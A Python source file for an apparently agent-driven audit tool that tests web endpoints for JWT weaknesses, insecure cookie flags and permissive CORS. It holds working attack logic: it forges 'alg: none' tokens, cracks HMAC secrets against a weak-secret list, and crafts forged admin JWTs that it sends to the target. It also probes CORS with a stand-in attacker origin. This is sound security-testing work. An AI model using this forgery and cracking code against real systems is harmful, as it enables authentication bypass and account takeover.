import base64
import hashlib
import hmac
import json
import time
from typing import Any, Optional
import httpx

from app.tools.base import BaseTool
from app.models.session import AuditSession
from app.models.observation import Observation
from app.models.attempt import AttackAttempt
from app.models.finding import FindingCategory, FindingType, Severity, Confidence
from app.models.attack_family import AttackFamily


class AuditJwtSessionTool(BaseTool):
    """Tool for auditing JWT signature security, cookie protection flags, and CORS configurations."""

    name = "audit_jwt_session"
    description = (
        "Empirically audits JWT authentication mechanisms for signature bypass ('alg: none', algorithm confusion, "
        "weak HMAC secrets, claim tampering), evaluates cookie security flags (HttpOnly, Secure, SameSite), "
        "and tests for permissive Cross-Origin Resource Sharing (CORS) misconfigurations."
    )
    parameters_schema = {
        "type": "object",
        "required": ["endpoint"],
        "properties": {
            "endpoint": {
                "type": "string",
                "description": "Target endpoint to audit (e.g. '/api/users/me', '/api/orders', '/login', '/')"
            },
            "method": {
                "type": "string",
                "enum": ["GET", "POST", "PUT", "DELETE", "PATCH"],
                "default": "GET"
            },
            "token": {
                "type": "string",
                "description": "Optional JWT string to test. If omitted, uses active_token from session context."
            },
            "test_jwt": {
                "type": "boolean",
                "default": True,
                "description": "Whether to perform JWT signature tampering and weakness checks."
            },
            "test_cookies": {
                "type": "boolean",
                "default": True,
                "description": "Whether to check Set-Cookie response headers for HttpOnly, Secure, SameSite."
            },
            "test_cors": {
                "type": "boolean",
                "default": True,
                "description": "Whether to test Cross-Origin Resource Sharing (CORS) with evil/null origins."
            }
        }
    }

    # Common dictionary of weak secrets for HMAC brute-force testing
    WEAK_SECRETS = [
        "secret", "jwtsecret", "password", "123456", "admin", "development",
        "test", "key", "secret123", "app_secret", "changeme", "supersecret",
        "secretkey", "jwt_secret", "12345678", "authsecret", "default"
    ]

    @staticmethod
    def _b64url_decode(payload: str) -> bytes:
        rem = len(payload) % 4
        if rem > 0:
            payload += "=" * (4 - rem)
        return base64.urlsafe_b64decode(payload.encode("utf-8"))

    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")

    def _parse_jwt(self, token: str) -> Optional[tuple[dict[str, Any], dict[str, Any], str, str]]:
        """Parses a JWT into (header_dict, payload_dict, header_b64, payload_b64)."""
        parts = token.strip().split(".")
        if len(parts) != 3:
            return None
        try:
            hdr_bytes = self._b64url_decode(parts[0])
            pay_bytes = self._b64url_decode(parts[1])
            hdr = json.loads(hdr_bytes.decode("utf-8"))
            pay = json.loads(pay_bytes.decode("utf-8"))
            return hdr, pay, parts[0], parts[1]
        except Exception:
            return None

    def _craft_unsigned_jwt(self, header: dict[str, Any], payload: dict[str, Any], alg_val: str = "none") -> str:
        new_hdr = dict(header)
        new_hdr["alg"] = alg_val
        h_str = self._b64url_encode(json.dumps(new_hdr, separators=(",", ":")).encode("utf-8"))
        p_str = self._b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
        return f"{h_str}.{p_str}."

    def _crack_weak_secret(self, token: str) -> Optional[str]:
        parts = token.strip().split(".")
        if len(parts) != 3:
            return None
        msg = f"{parts[0]}.{parts[1]}".encode("utf-8")
        actual_sig = parts[2]
        for secret in self.WEAK_SECRETS:
            computed_sig = self._b64url_encode(
                hmac.new(secret.encode("utf-8"), msg, hashlib.sha256).digest()
            )
            if computed_sig == actual_sig:
                return secret
        return None

    async def execute(self, session: AuditSession, **kwargs: Any) -> Observation:
        endpoint = kwargs.get("endpoint", "/")
        method = kwargs.get("method", "GET").upper()
        token = kwargs.get("token") or session.context_data.get("active_token")
        test_jwt = kwargs.get("test_jwt", True)
        test_cookies = kwargs.get("test_cookies", True)
        test_cors = kwargs.get("test_cors", True)

        resolved_url = self.validate_target(session, endpoint)
        insights: list[str] = []
        findings_suggested: list[dict[str, Any]] = []
        causal_chain: list[str] = []
        jwt_results: dict[str, Any] = {}
        cookie_results: dict[str, Any] = {}
        cors_results: dict[str, Any] = {}

        async with httpx.AsyncClient(timeout=8.0, follow_redirects=False, verify=False) as client:
            # -------------------------------------------------------------
            # 1. BASELINE REQUEST
            # -------------------------------------------------------------
            base_headers = {}
            if token:
                base_headers["Authorization"] = f"Bearer {token}"
            try:
                base_resp = await client.request(method=method, url=resolved_url, headers=base_headers)
                base_status = base_resp.status_code
            except Exception as e:
                base_resp = None
                base_status = 0

            # -------------------------------------------------------------
            # 2. JWT SECURITY CHECKS
            # -------------------------------------------------------------
            if test_jwt and token:
                parsed = self._parse_jwt(token)
                if not parsed:
                    insights.append(f"Token provided on {endpoint} is not a valid 3-part JWT format.")
                else:
                    header, payload, h_b64, p_b64 = parsed
                    jwt_results["header"] = header
                    jwt_results["algorithm"] = header.get("alg")

                    # Check 2a: Weak HMAC Secret offline check
                    cracked_secret = self._crack_weak_secret(token)
                    if cracked_secret:
                        jwt_results["cracked_secret"] = cracked_secret
                        insights.append(
                            f"CRITICAL JWT FLAW: The HMAC secret key was cracked offline using dictionary attack! Key='{cracked_secret}'."
                        )
                        causal_chain.append(f"Extracted JWT token from session: signature verified against known weak secret '{cracked_secret}'")
                        findings_suggested.append({
                            "title": f"Weak or Default HMAC Secret Key in JWT on {endpoint}",
                            "category": FindingCategory.SESSION_TOKEN_ABUSE,
                            "finding_type": FindingType.SECURITY_VULNERABILITY,
                            "attack_family": AttackFamily.SESSION_TOKEN_ABUSE.value,
                            "severity": Severity.CRITICAL,
                            "confidence": Confidence.HIGH,
                            "description": (
                                f"The JWT utilized on {endpoint} was signed using an insecure, predictable, or default secret "
                                f"('{cracked_secret}'). An attacker can forge arbitrary JWTs with administrative roles."
                            ),
                            "impact": "Complete authentication and authorization bypass across all application services.",
                            "remediation": "Generate a cryptographically secure random secret with at least 256 bits of entropy and rotate current signing keys."
                        })

                    # Check 2b: 'alg: none' Signature Bypass
                    for alg_candidate in ["none", "None", "NONE"]:
                        unsigned_token = self._craft_unsigned_jwt(header, payload, alg_candidate)
                        try:
                            tamper_resp = await client.request(
                                method=method,
                                url=resolved_url,
                                headers={"Authorization": f"Bearer {unsigned_token}"}
                            )
                            jwt_results[f"alg_{alg_candidate}_status"] = tamper_resp.status_code
                            if tamper_resp.status_code == 200 and base_status in (200, 201):
                                insights.append(
                                    f"CRITICAL JWT BYPASS: Target accepted unsigned JWT with 'alg: {alg_candidate}' (HTTP 200)!"
                                )
                                causal_chain.append(f"Forged unsigned JWT with alg: '{alg_candidate}' and sent to {endpoint}: server accepted without signature verification (HTTP 200)")
                                findings_suggested.append({
                                    "title": f"JWT 'alg: none' Signature Bypass Vulnerability on {endpoint}",
                                    "category": FindingCategory.AUTHENTICATION,
                                    "finding_type": FindingType.SECURITY_VULNERABILITY,
                                    "attack_family": AttackFamily.AUTHENTICATION.value,
                                    "severity": Severity.CRITICAL,
                                    "confidence": Confidence.HIGH,
                                    "description": (
                                        f"The JWT verification middleware on {endpoint} accepts tokens with 'alg: {alg_candidate}' "
                                        f"without enforcing cryptographic signature validation."
                                    ),
                                    "impact": "Unauthenticated attackers can forge valid tokens with arbitrary identities and administrative roles.",
                                    "remediation": "Explicitly reject tokens with 'alg: none' and enforce expected asymmetric or symmetric signing algorithms."
                                })
                                break
                        except Exception as e:
                            jwt_results[f"alg_{alg_candidate}_error"] = str(e)

                    # Check 2c: Privilege Escalation Claim Probe (if secret cracked or alg: none worked)
                    escalated_payload = dict(payload)
                    escalated_payload["role"] = "admin"
                    escalated_payload["is_admin"] = True
                    escalated_payload["sub"] = "admin"
                    if cracked_secret:
                        esc_msg = f"{h_b64}.{self._b64url_encode(json.dumps(escalated_payload).encode('utf-8'))}".encode("utf-8")
                        esc_sig = self._b64url_encode(hmac.new(cracked_secret.encode("utf-8"), esc_msg, hashlib.sha256).digest())
                        esc_token = f"{esc_msg.decode('utf-8')}.{esc_sig}"
                        try:
                            esc_resp = await client.request(
                                method=method,
                                url=resolved_url,
                                headers={"Authorization": f"Bearer {esc_token}"}
                            )
                            jwt_results["forged_admin_status"] = esc_resp.status_code
                            if esc_resp.status_code == 200:
                                insights.append("CONFIRMED FORGERY: Forged admin JWT successfully authenticated (HTTP 200).")
                        except Exception:
                            pass

            # -------------------------------------------------------------
            # 3. COOKIE SECURITY ATTRIBUTE CHECKS
            # -------------------------------------------------------------
            if test_cookies and base_resp:
                cookie_headers = base_resp.headers.get_list("set-cookie") if hasattr(base_resp.headers, "get_list") else [base_resp.headers.get("set-cookie", "")]
                cookie_headers = [c for c in cookie_headers if c]
                cookie_results["count"] = len(cookie_headers)

                for raw_cookie in cookie_headers:
                    parts = [p.strip() for p in raw_cookie.split(";")]
                    c_name_val = parts[0] if parts else ""
                    c_name = c_name_val.split("=")[0] if "=" in c_name_val else c_name_val
                    flags_lower = [p.lower() for p in parts[1:]]

                    is_sensitive = any(k in c_name.lower() for k in ["session", "auth", "token", "jwt", "id", "sid", "user"])
                    has_httponly = any("httponly" in f for f in flags_lower)
                    has_secure = any("secure" in f for f in flags_lower)
                    has_samesite = any("samesite" in f for f in flags_lower)

                    if is_sensitive:
                        if not has_httponly:
                            insights.append(f"INSECURE COOKIE: Sensitive cookie '{c_name}' is missing the 'HttpOnly' flag.")
                            findings_suggested.append({
                                "title": f"Missing 'HttpOnly' Flag on Sensitive Cookie '{c_name}'",
                                "category": FindingCategory.SECURITY_MISCONFIGURATION,
                                "finding_type": FindingType.SECURITY_VULNERABILITY,
                                "attack_family": AttackFamily.SECURITY_MISCONFIGURATION.value,
                                "severity": Severity.MEDIUM,
                                "confidence": Confidence.HIGH,
                                "description": f"The cookie '{c_name}' contains session or authorization state but lacks 'HttpOnly', allowing client-side scripts to read it via XSS.",
                                "impact": "Exposure to session hijacking if any Cross-Site Scripting (XSS) vulnerability exists.",
                                "remediation": "Set 'HttpOnly' on all cookies containing session identifiers or authentication tokens."
                            })

                        if not has_secure:
                            insights.append(f"INSECURE COOKIE: Cookie '{c_name}' is missing the 'Secure' flag.")
                            findings_suggested.append({
                                "title": f"Missing 'Secure' Flag on Cookie '{c_name}'",
                                "category": FindingCategory.SECURITY_MISCONFIGURATION,
                                "finding_type": FindingType.SECURITY_VULNERABILITY,
                                "attack_family": AttackFamily.SECURITY_MISCONFIGURATION.value,
                                "severity": Severity.LOW,
                                "confidence": Confidence.HIGH,
                                "description": f"The cookie '{c_name}' lacks the 'Secure' attribute, permitting transmission over unencrypted HTTP channels.",
                                "impact": "Potential interception of session tokens over insecure networks.",
                                "remediation": "Add the 'Secure' attribute to ensure cookies are only transmitted over TLS."
                            })

                        if not has_samesite:
                            insights.append(f"INSECURE COOKIE: Cookie '{c_name}' is missing the 'SameSite' attribute.")
                            findings_suggested.append({
                                "title": f"Missing 'SameSite' Protection on Cookie '{c_name}'",
                                "category": FindingCategory.SECURITY_MISCONFIGURATION,
                                "finding_type": FindingType.SECURITY_VULNERABILITY,
                                "attack_family": AttackFamily.SECURITY_MISCONFIGURATION.value,
                                "severity": Severity.LOW,
                                "confidence": Confidence.HIGH,
                                "description": f"The cookie '{c_name}' does not specify a SameSite policy (Lax/Strict), exposing mutation endpoints to Cross-Site Request Forgery (CSRF).",
                                "impact": "Increased susceptibility to Cross-Site Request Forgery (CSRF).",
                                "remediation": "Configure 'SameSite=Lax' or 'SameSite=Strict' for all session cookies."
                            })

            # -------------------------------------------------------------
            # 4. CORS PERMISSIVE CONFIGURATION CHECKS
            # -------------------------------------------------------------
            if test_cors:
                evil_origin = "https://evil-attacker.example.com"
                for test_origin in [evil_origin, "null"]:
                    try:
                        cors_req_headers = {"Origin": test_origin}
                        if token:
                            cors_req_headers["Authorization"] = f"Bearer {token}"

                        cors_resp = await client.request(method="OPTIONS", url=resolved_url, headers=cors_req_headers)
                        if cors_resp.status_code in (404, 405):
                            # Try GET with Origin header
                            cors_resp = await client.request(method=method, url=resolved_url, headers=cors_req_headers)

                        allow_origin = cors_resp.headers.get("access-control-allow-origin", "")
                        allow_creds = cors_resp.headers.get("access-control-allow-credentials", "").lower() == "true"
                        cors_results[test_origin] = {
                            "allow_origin": allow_origin,
                            "allow_credentials": allow_creds,
                            "status": cors_resp.status_code
                        }

                        # Check for vulnerable CORS combinations
                        if allow_origin == test_origin and allow_creds:
                            insights.append(
                                f"CRITICAL CORS FLAW: Origin '{test_origin}' reflected with Access-Control-Allow-Credentials: true!"
                            )
                            causal_chain.append(f"Sent Origin '{test_origin}' to {endpoint}: server reflected '{allow_origin}' with Allow-Credentials: true")
                            findings_suggested.append({
                                "title": f"Permissive CORS Misconfiguration with Credentials on {endpoint}",
                                "category": FindingCategory.SECURITY_MISCONFIGURATION,
                                "finding_type": FindingType.SECURITY_VULNERABILITY,
                                "attack_family": AttackFamily.SECURITY_MISCONFIGURATION.value,
                                "severity": Severity.HIGH,
                                "confidence": Confidence.HIGH,
                                "description": (
                                    f"The application dynamically reflects untrusted Origin '{test_origin}' in "
                                    f"Access-Control-Allow-Origin while setting Access-Control-Allow-Credentials: true. "
                                    f"This allows external malicious websites to read authenticated API responses."
                                ),
                                "impact": "Complete cross-origin data exfiltration of authenticated user data.",
                                "remediation": "Implement an explicit whitelist of trusted origins and never reflect arbitrary origins with credentials enabled."
                            })
                            break
                        elif allow_origin == "*" and allow_creds:
                            insights.append("CRITICAL CORS FLAW: Wildcard origin '*' configured with Allow-Credentials: true.")
                            findings_suggested.append({
                                "title": f"Insecure Wildcard CORS Configuration with Credentials on {endpoint}",
                                "category": FindingCategory.SECURITY_MISCONFIGURATION,
                                "finding_type": FindingType.SECURITY_VULNERABILITY,
                                "attack_family": AttackFamily.SECURITY_MISCONFIGURATION.value,
                                "severity": Severity.HIGH,
                                "confidence": Confidence.HIGH,
                                "description": "Access-Control-Allow-Origin is set to '*' alongside Access-Control-Allow-Credentials: true.",
                                "impact": "Cross-origin data access violation.",
                                "remediation": "Disable credentials or restrict allowed origins to an explicit whitelist."
                            })
                            break
                        elif test_origin == "null" and allow_origin == "null":
                            insights.append("POTENTIAL CORS FLAW: Access-Control-Allow-Origin allows 'null' origin.")
                            findings_suggested.append({
                                "title": f"Null Origin Permitted in CORS Policy on {endpoint}",
                                "category": FindingCategory.SECURITY_MISCONFIGURATION,
                                "finding_type": FindingType.SECURITY_VULNERABILITY,
                                "attack_family": AttackFamily.SECURITY_MISCONFIGURATION.value,
                                "severity": Severity.MEDIUM,
                                "confidence": Confidence.HIGH,
                                "description": "The application trusts the 'null' origin, which can be abused via sandboxed iframes to bypass cross-origin restrictions.",
                                "impact": "Unauthorized cross-origin read access from sandboxed contexts.",
                                "remediation": "Do not allow 'null' origin in Access-Control-Allow-Origin."
                            })
                    except Exception as e:
                        cors_results[test_origin] = {"error": str(e)}

        attempt = AttackAttempt(
            step=session.step_count,
            tool=self.name,
            target=resolved_url,
            action_summary=f"JWT, Session & CORS Security Audit on {method} {endpoint}",
            request_data={
                "endpoint": endpoint,
                "has_token": bool(token),
                "test_jwt": test_jwt,
                "test_cookies": test_cookies,
                "test_cors": test_cors
            },
            response_summary=f"Findings detected: {len(findings_suggested)}",
            result="VULNERABILITY_CONFIRMED" if findings_suggested else "SECURITY_CONTROLS_VERIFIED"
        )
        session.add_attempt(attempt)

        summary = (
            f"JWT/Session/CORS audit on {method} {endpoint}: "
            f"Findings detected: {len(findings_suggested)}. "
            f"JWT={len(jwt_results)} checks, CORS={len(cors_results)} checks."
        )

        return Observation(
            step=session.step_count,
            tool=self.name,
            target=endpoint,
            summary=summary,
            key_insights=insights or ["JWT, Cookie, and CORS security configurations are properly hardened."],
            raw_data={
                "endpoint": endpoint,
                "jwt": jwt_results,
                "cookies": cookie_results,
                "cors": cors_results,
                "findings_suggested": findings_suggested,
                "causal_chain": causal_chain
            }
        )
